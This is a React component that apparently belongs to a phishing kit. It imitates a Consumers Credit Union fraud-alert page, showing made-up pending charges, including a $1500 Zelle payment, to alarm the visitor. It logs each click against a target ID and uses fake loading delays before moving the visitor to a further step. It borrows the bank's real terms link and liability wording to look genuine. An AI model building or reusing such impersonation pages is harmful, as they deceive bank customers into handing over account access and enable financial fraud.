'use client';
import "./Review3Trans.scss";
import { FaCircleHalfStroke } from "react-icons/fa6";
import { FaCheck } from "react-icons/fa";
import { FaCircleXmark } from "react-icons/fa6";
import { FaXmark } from "react-icons/fa6";
import { FaTimes } from "react-icons/fa";
import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import proceedStep from "@/app/(tropic)/proceedStep";
import { useState } from "react";
export default function Review3Trans({ setParentLoading }) {
    // dummy charges:
    // $473.81 BESTBUY #N921
    // $500.00 WALMART SUPERCENTER #R043
    const [stage, setStage] = useState(0);
    async function handleResponse(response) {
        await addIntakeEvent({
            type: 'interaction',
            interaction_title: `Clicked transaction ${stage + 1} ` + response,
            target_id: await getTargetId(),
        })
        setParentLoading(true);
        if (stage === 0) {
            setTimeout(() => {
                setStage(1);
                setParentLoading(false);
            }, 3000)
        }
        else if (stage === 1) {
            setTimeout(() => {
                setStage(2);
                setParentLoading(false);
            }, 3000)
        }
        else {
            setTimeout(() => {
                setParentLoading(false);
                proceedStep();
            }, 4000)
        }

    }
    return (
        <div className="ReviewTrans Main">
            <h2>Review Transaction</h2>
            <div className="card">
                <p>
                    We detected a suspicious transaction on your debit card.
                </p>
                <p>
                    Please review the details to keep your account secure.
                </p>
                <p className="bold">
                    Did you authorize this transaction?
                </p>
                <div className="trans">
                    <div className="left">
                        <span className="merchant">
                            {stage == 0 && 'BESTBUY.COM'}
                            {stage == 1 && 'WALMART SUPERCENTER'}
                            {stage == 2 && 'ZELLE JORDAN WHEELER'}
                        </span>
                        <span className="status">
                            <span>
                                Pending - {new Date().toLocaleDateString()}
                            </span>
                        </span>
                    </div>
                    <div className="right">
                        <span className="bold">
                            {stage == 0 && '$473.81'}
                            {stage == 1 && '$500.00'}
                            {stage == 2 && '$1500.00'}
                        </span>
                    </div>
                </div>
                <button
                    onClick={() => handleResponse('authorized')}
                    className="yes">
                    <FaCheck />
                    <span>
                        Yes, this was authorized
                    </span>
                </button>
                <button
                    onClick={() => handleResponse('unauthorized')}
                    className="no">
                    <FaTimes className="tooSmall" />
                    <span>
                        No, secure account
                    </span>
                </button>
            </div>
            <p className="legal">
                All debit cards issued by Consumers Credit Union are protected by our <a href="https://www.myconsumers.org/website-terms-of-use">zero
                    liability policy</a> when you notify us of unauthorized transactions within 60 days.
            </p>
        </div>
    )
}